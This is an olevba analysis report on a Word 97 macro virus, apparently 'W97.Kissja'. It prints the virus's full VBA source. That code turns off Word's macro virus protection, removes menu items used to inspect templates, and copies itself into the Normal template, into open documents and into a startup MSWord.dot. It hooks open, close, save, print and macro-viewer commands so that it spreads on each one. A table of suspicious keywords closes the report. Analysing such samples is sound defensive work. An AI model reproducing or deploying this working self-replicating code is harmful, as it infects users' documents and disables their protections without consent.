olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Kissja
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Kissja - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO MSWord.bas 
in file: ./Virus.MSWord.Kissja - OLE stream: 'Macros/VBA/MSWord'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Myself, NormInstall, ActivInstall As Boolean
Private FinalClose As Boolean
Private HoldDoc As String

Sub W97()
On Error Resume Next
Myself = True
Application.ScreenUpdating = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
HoldDoc = ActiveDocument.FullName
CommandBars("Tools").Controls("Templates and Add-Ins...").Delete
CommandBars("Format").Controls("Style...").Delete
If (GetAttr(NormalTemplate.FullName) <> vbNormal) Then SetAttr (NormalTemplate.FullName), vbNormal
' Get up, get up Bulgarian superman!!
Application.VBE.ActiveVBProject.VBComponents("MSWord").Export "c:\MSWord.sys"
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
'666
If NormalTemplate.VBProject.VBComponents(I).Name = "MSWord" Then NormInstall = True
Next I
For I = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(I).Name = "MSWord" Then ActivInstall = True
Next I
If NormInstall = False Then NormalTemplate.VBProject.VBComponents.Import ("c:\MSWord.sys")
If ActivInstall = False Then ActiveDocument.VBProject.VBComponents.Import ("c:\MSWord.sys")
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
'W97.Kissja_Tommy.G (c) 1998 by Vesselin Bontchev
If (GetAttr(Application.StartupPath + "\MSWord.dot") <> vbNormal) Then SetAttr (Application.StartupPath + "\MSWord.dot"), vbNormal
ActiveDocument.SaveAs FileName:=Application.StartupPath + "\MSWord.dot", _
FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
If FinalClose = False Then Documents.Open FileName:=HoldDoc
Documents("MSWord.dot").Close
SetAttr (Application.StartupPath + "\MSWord.dot"), vbReadOnly
Application.ScreenUpdating = True
Myself = False
End Sub

Sub AutoOpen()
On Error Resume Next
If Myself = False Then Call W97
End Sub

Sub AutoClose()
On Error Resume Next
FinalClose = True
Call W97
End Sub

Sub AutoExit()
On Error Resume Next
Call W97
End Sub

Sub FileSaveAs()
On Error Resume Next
Call W97
Dialogs(wdDialogFileSaveAs).Show
End Sub

Sub filesave()
On Error Resume Next
Call W97
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End Sub

Sub fileclose()
On Error Resume Next
Call W97
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
ActiveDocument.Close
End Sub

Sub fileprint()
On Error Resume Next
Call W97
Dialogs(wdDialogFilePrint).Show
End Sub

Sub ViewVBCode()
On Error Resume Next
Call W97
End Sub

Sub ToolsMacro()
On Error Resume Next
Call W97
End Sub

Sub FileTemplates()
On Error Resume Next
Call W97
End Sub



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

